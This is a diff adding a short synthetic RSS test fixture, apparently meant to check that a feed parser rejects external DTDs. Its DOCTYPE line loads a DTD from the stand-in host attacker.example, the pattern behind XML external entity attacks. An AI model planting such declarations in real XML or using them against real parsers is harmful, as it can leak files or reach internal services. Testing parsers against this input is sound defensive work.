@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- HOSTILE TEST FIXTURE (synthetic): an external DTD fetched from a remote host. -->
+<!DOCTYPE rss SYSTEM "http://attacker.example/evil.dtd">
+<rss version="2.0"><channel><item><title>x</title><guid>HOSTILE-DTD-1</guid></item></channel></rss>
